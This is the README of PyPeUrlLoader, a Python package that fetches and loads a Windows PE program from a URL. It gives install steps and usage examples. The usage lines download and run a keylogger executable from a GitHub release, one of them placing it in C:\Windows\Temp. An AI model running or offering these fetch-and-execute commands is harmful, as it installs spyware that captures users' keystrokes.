![PyPeUrlLoader Logo](https://mauricelambert.github.io/info/python/security/PyPeUrlLoader_small.png "PyPeUrlLoader logo")

# PyPeUrlLoader

## Description

This package uses PyPeLoader to load a PE program from a HTTP server
(from an URL).

## Requirements

This package require:

 - python3
 - python3 Standard Library

## Installation

### Pip

```bash
python3 -m pip install PyPeUrlLoader
```

### Git

```bash
git clone "https://github.com/mauricelambert/PyPeUrlLoader.git"
cd "PyPeUrlLoader"
python3 -m pip install .
```

### Wget

```bash
wget https://github.com/mauricelambert/PyPeUrlLoader/archive/refs/heads/main.zip
unzip main.zip
cd PyPeUrlLoader-main
python3 -m pip install .
```

### cURL

```bash
curl -O https://github.com/mauricelambert/PyPeUrlLoader/archive/refs/heads/main.zip
unzip main.zip
cd PyPeUrlLoader-main
python3 -m pip install .
```

## Usages

### Command line

```bash
PyPeUrlLoader              # Using CLI package executable
python3 -m PyPeUrlLoader   # Using python module
python3 PyPeUrlLoader.pyz  # Using python executable
PyPeUrlLoader.exe          # Using python Windows executable

PyPeUrlLoader https://github.com/mauricelambert/NimKeylogger/releases/download/v0.0.1/Keylogger.exe keylogger
PyPeUrlLoader https://github.com/mauricelambert/NimKeylogger/releases/download/v0.0.1/Keylogger.exe keylogger C:\Windows\Temp\keylogger.exe
```

## Links

 - [Pypi](https://pypi.org/project/PyPeUrlLoader)
 - [Github](https://github.com/mauricelambert/PyPeUrlLoader)
 - [Documentation](https://mauricelambert.github.io/info/python/security/PyPeUrlLoader.html)
 - [Python executable](https://mauricelambert.github.io/info/python/security/PyPeUrlLoader.pyz)
 - [Python Windows executable](https://mauricelambert.github.io/info/python/security/PyPeUrlLoader.exe)

## License

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
